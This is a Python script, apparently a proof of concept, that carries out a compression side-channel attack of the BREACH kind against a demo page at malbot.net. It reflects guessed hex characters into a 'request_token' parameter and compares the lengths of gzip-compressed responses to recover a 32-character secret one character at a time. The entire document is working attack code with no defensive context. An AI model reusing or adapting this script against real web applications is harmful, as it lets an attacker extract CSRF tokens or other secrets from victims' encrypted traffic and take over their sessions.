import urllib.parse
import urllib.request
"""
    Function Name: enviarPeticion
    Input: url that the request will be sent to
           req the actual request that will be returned as an output of the function as to be sent
           secreto the secret word that we want to find
           extra the payload that we will add to the request in order to distinguish the secret that we are trying from the rest of the payload
    Output: req the request ready to be sent
    Function: Prepares the request to be sent, uses the library urllib.request
"""
def enviarPeticion(url,req,secreto,extra):
    url = url + secreto + extra
    req = urllib.request.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
    req.add_header('Accept-Encoding','gzip, deflate')
    return req
def obtenerLongitud(req):
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        longitud=len(the_page)
        return longitud
req=0
secreto = ''
longitud=32
breaks = "{}{}{}"
menor = 100000
index=0
url="http://malbot.net/poc/?request_token='"
i= 0
flag = True
caracteres=[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101]
no=0
for j in range(longitud):
    url="http://malbot.net/poc/?request_token='"
    menor=100000
    flag = True
    while flag:
        caracter = chr(caracteres[i])
        req=enviarPeticion(url, req , secreto, caracter + breaks  + "'")
        longitud1=obtenerLongitud(req)
        if(longitud1<= menor):
            if(longitud1==menor):
                req=enviarPeticion(url,req, secreto, breaks  + chr(caracteres[index]) + "'")
                longitud2=obtenerLongitud(req)                                
                if ((longitud1-longitud2) < 0):
                    secreto = secreto + chr(caracteres[index])
                    i=0
                    flag = False
                else:
                    req=enviarPeticion(url, req, secreto, breaks  + caracter + "'")
                    longitud2=obtenerLongitud(req)                                                
                    if ((longitud1-longitud2) < 0):
                        secreto = secreto + caracter
                        i=0
                        flag = False  
                no=1
            if(no==1 and longitud1 != menor):
                no=0                        
            menor = longitud1
            index = i
        i=i+1
        if(i == len(caracteres) and no==1 and index != i and longitud1==menor):
            no=0
            url = "http://malbot.net/poc/?'"
            i=0
        if(i == len(caracteres)):
            i=0
            secreto = secreto + chr(caracteres[index])
            flag = False
    print(secreto)       
